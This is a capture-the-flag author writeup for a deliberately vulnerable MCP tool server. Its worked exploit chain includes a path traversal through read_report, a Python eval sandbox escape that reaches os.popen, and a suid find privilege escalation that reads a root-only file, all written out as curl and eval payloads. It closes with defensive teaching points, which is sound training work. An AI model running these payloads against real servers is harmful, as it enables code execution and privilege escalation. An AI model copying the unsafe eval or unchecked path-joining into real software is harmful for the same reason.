# referee_briefing — Author Writeup

**Category:** LLM / MCP Security
**Difficulty:** Medium (user flag) + Hard (root flag)
**Service:** `POST http://<host>:8008/mcp`

This challenge is a two-flag tour of what happens when an MCP
(Model Context Protocol) server is written with the assumption that
"only a friendly LLM will ever call these tools." Players talk to
the server directly with any HTTP client — no LLM required.

## 0. Background — MCP in 60 seconds

MCP is a JSON-RPC 2.0 protocol spoken by LLM runtimes to call out
to tool servers. The three methods we need:

```
POST /mcp
  {"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}
  {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
  {"jsonrpc":"2.0","id":3,"method":"tools/call",
   "params":{"name":"<tool>","arguments":{...}}}
```

`tools/call` returns a `content` array of MCP blocks; we only care
about `{"type":"text","text":...}` entries.

## 1. Recon

```bash
curl -s http://target:8008/health
# {"name":"infodays-var-referee-briefing",...}

curl -s -X POST http://target:8008/mcp \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
```

Three tools come back:

| Tool | Description |
|------|-------------|
| `list_reports` | Lists `*.md` files in the referee report folder |
| `read_report`  | Reads a report by filename |
| `match_stats`  | Evaluates a Python formula over match metrics |

Source for the server is `server/server.py` — the whole thing is
under 300 lines and the interesting bits are `tool_read_report`
and `tool_match_stats`.

## 2. Flag 1 — Medium (user) — path traversal

The vulnerable tool:

```python
def tool_read_report(args: dict) -> dict:
    name = args.get("name", "")
    # The referee's reports live under /app/reports. We join the
    # requested filename onto that directory and open it.
    path = f"{REPORTS_DIR}/{name}"
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        text = fh.read()
    return _ok(text)
```

No normalization, no containment check, no filename whitelist.
Whatever the player sends gets concatenated straight into the
filesystem path.

The user flag lives at `/app/secrets/user_flag.txt`, which is one
`..` above `/app/reports`. Traverse out:

```bash
curl -s -X POST http://target:8008/mcp \
  -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call",
       "params":{"name":"read_report",
                 "arguments":{"name":"../secrets/user_flag.txt"}}}'
```

Response contains:

```
INFODAYS{SaamNoLimits_mcp_tool_path_traversal_<hex>}
```

### Why it slipped through

The schema claims `name` is "Report filename (not an absolute
path)", but nothing actually enforces that. Schema descriptions
are hints for LLM callers — they are not input validators. This
is a recurring class of MCP bug: authors write a polite prompt in
the schema and then trust the LLM to follow it.

## 3. Flag 2 — Hard (root)

### 3a. Breaking the "sandbox"

```python
def tool_match_stats(args: dict) -> dict:
    expression = args.get("expression", "")
    # "Sandboxed" eval: we blank out __builtins__ and only expose
    # the match metrics as locals.
    result = eval(expression, {"__builtins__": {}}, dict(MATCH_METRICS))
    return _ok(f"result = {result}")
```

This is the canonical "I cleared builtins so eval is safe" pattern.
It has been broken since Python 2.x. The short version:

- Clearing `__builtins__` removes the easy names (`open`, `print`,
  `__import__`, etc.) from the name-lookup chain.
- But Python's object graph is *still reachable* from any literal
  that doesn't require a name. `()` is a tuple literal. Tuples are
  instances of `tuple`, which inherits from `object`, which has an
  `__mro__` and a `__subclasses__()` method listing every class
  currently loaded in the interpreter.
- From that subclass list you can pick any class whose `__init__`
  closes over a module you need — and read that module out of
  `__init__.__globals__`.

We want `os.popen`. The class `os._wrap_close` is registered in
`object.__subclasses__()` as soon as `os` is imported (which
`server.py` does at the top). Its `__init__.__globals__` *is* the
`os` module's global namespace, so `['popen']` gives us the
function.

```python
# inside the eval
[c for c in ().__class__.__mro__[-1].__subclasses__()
 if c.__name__ == '_wrap_close'][0].__init__.__globals__['popen']
```

That expression evaluates to the `os.popen` callable without ever
typing the names `os`, `popen`, `import`, `open`, or `__builtins__`.
Pass it a command, `.read()` the pipe, and you have a shell call
primitive.

First, sanity-check with `id`:

```bash
curl -s -X POST http://target:8008/mcp -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"match_stats",
       "arguments":{"expression":"[c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__ == '\''_wrap_close'\''][0].__init__.__globals__['\''popen'\'']('\''/bin/id'\'').read()"}}}'
```

Returns `uid=1000(referee) gid=1000(referee) ...` — you have RCE
as the `referee` user inside the container.

### 3b. referee → root via suid find

`/root/root_flag.txt` is mode 600, root-owned. `referee` cannot
read it directly. Look for setuid binaries:

```
find / -perm -u=s 2>/dev/null
# ...
# /usr/bin/find
```

`/usr/bin/find` is suid root (courtesy of a very deliberate
`RUN chmod u+s /usr/bin/find` in the Dockerfile, marketed in-world
as "legacy referee search wrapper"). Straight from
[GTFOBins](https://gtfobins.github.io/gtfobins/find/):

```
find . -exec cat /root/root_flag.txt \;
```

`find` is running with EUID=0 because of the suid bit. When it
forks `cat`, `cat` inherits EUID=0 and reads the root-only file.

### 3c. One-shot eval payload

Chain everything into a single `match_stats` call. The shell
command we want executed inside the container is:

```
/usr/bin/find /tmp -maxdepth 0 -exec /bin/cat /root/root_flag.txt \;
```

(`-maxdepth 0 /tmp` guarantees exactly one `-exec` invocation.)

The full eval expression:

```python
[c for c in ().__class__.__mro__[-1].__subclasses__()
 if c.__name__ == '_wrap_close'][0].__init__.__globals__['popen'](
    '/usr/bin/find /tmp -maxdepth 0 -exec /bin/cat /root/root_flag.txt ;'
).read()
```

Sent through MCP:

```bash
curl -s -X POST http://target:8008/mcp -H 'content-type: application/json' \
  -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"match_stats",
       "arguments":{"expression":"<the expression above as a JSON string>"}}}'
```

The server returns:

```
result = INFODAYS{SaamNoLimits_mcp_eval_sandbox_escape_root_<hex>}
```

## 4. Full automated solver

`solver/solve.py` runs the whole chain in pure stdlib (urllib +
json). Against a running container:

```bash
python3 solver/solve.py 127.0.0.1 8008
# [*] target: http://127.0.0.1:8008/mcp
# [+] server: infodays-var-referee-briefing v1.0.0
# [+] tools: list_reports, read_report, match_stats
# [*] stage 1 — path traversal in read_report
# [+] flag 1 (user): INFODAYS{SaamNoLimits_mcp_tool_path_traversal_<hex>}
# [*] stage 2 — eval sandbox escape + suid find
# [+] flag 2 (root): INFODAYS{SaamNoLimits_mcp_eval_sandbox_escape_root_<hex>}
```

## 5. Teaching points

- **Schemas are documentation, not validation.** MCP tool schemas
  describe intent; they do not sanitize inputs. Authors must
  validate every argument inside the tool body.
- **Filesystem tools need a containment check**, not just a
  "filename not path" prompt. `os.path.commonpath` or a resolved
  `Path.is_relative_to` catches `..` traversal.
- **`eval` is never a sandbox.** Clearing `__builtins__` blocks
  the easy attacks but Python's object graph keeps every loaded
  class reachable from any literal. Use `ast.literal_eval` for
  data, or a purpose-built expression evaluator for formulas.
- **Defense in depth.** Even if the eval had been locked down,
  the container still shipped a suid `find` binary. A real
  deployment removes suid bits on anything the service user does
  not need, and runs the service as a non-root user with no
  writable escalation targets.

## 6. Files in this challenge

| Path | Purpose |
|------|---------|
| `server/server.py` | Vulnerable MCP server (stdlib only) |
| `server/reports/*.md` | Sample referee reports, world-readable |
| `Dockerfile` | Installs flags, sets suid find, drops to referee |
| `docker-compose.yml` | Standalone service on 8008 |
| `entrypoint.sh` | Writes flags from env, runs server as referee |
| `gen.py` | Rotates flag hex suffix, writes `.env` + `flag.txt` |
| `solver/solve.py` | Full exploit chain, pure stdlib |
| `README.md` | Player-facing brief |
| `WRITEUP.md` | This file |
